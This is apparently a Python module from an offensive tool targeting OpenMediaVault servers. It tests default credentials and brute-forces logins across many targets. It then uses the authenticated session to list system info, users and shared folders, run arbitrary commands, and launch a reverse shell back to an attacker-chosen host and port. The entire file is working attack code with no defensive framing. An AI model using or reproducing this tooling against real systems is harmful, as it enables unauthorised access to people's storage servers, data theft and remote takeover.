from core import openmediavault
from core.enums import OMVDEFAULTCREDS
from core.settings import PYTHON_REVERSE_SHELL

def test_default_credentials(target_list):

    success_results = {}

    for target in target_list:
        cookie = openmediavault.authenticate(target, OMVDEFAULTCREDS.USERNAME.value, OMVDEFAULTCREDS.PASSWORD.value)

        if cookie:
            success_results[target] = {"username": OMVDEFAULTCREDS.USERNAME.value, "password": OMVDEFAULTCREDS.PASSWORD.value}

    return success_results

def bruteforce_credentials(target_list, username_list, password_list):

    success_results = {}

    credentials = [(username, password) for username in username_list for password in password_list]

    for target in target_list:
        for username, password in credentials:
            cookie = openmediavault.authenticate(target, username, password)
            if cookie:
                success_results[target] = {"username": username, "password": password}
                break
                    
    return success_results

def test_creds_on_target(target, username, password):
    cookie = openmediavault.authenticate(target, username, password)

    return True if cookie else False

def get_system_info(target, username, password):
    cookie = openmediavault.authenticate(target, username, password)

    if cookie:
        return openmediavault.get_system_info(target, cookie)

def get_system_users(target, username, password):
    cookie = openmediavault.authenticate(target, username, password)

    if cookie:
        return openmediavault.get_system_users(target, cookie)

def get_shared_folders(target, username, password):
    cookie = openmediavault.authenticate(target, username, password)

    if cookie:
        return openmediavault.get_shared_folders(target, cookie)

def run_command_on_target(target, username, password, command):
    cookie = openmediavault.authenticate(target, username, password)

    if cookie:
        return openmediavault.execute_cmd(target, cookie, command, get_output=True)

def run_revshell_on_target(target, username, password, lhost, lport):
    shell_cmd = PYTHON_REVERSE_SHELL.replace("{LHOST}", lhost).replace("{LPORT}", lport)

    cookie = openmediavault.authenticate(target, username, password)

    if cookie:
        openmediavault.execute_cmd(target, cookie, shell_cmd)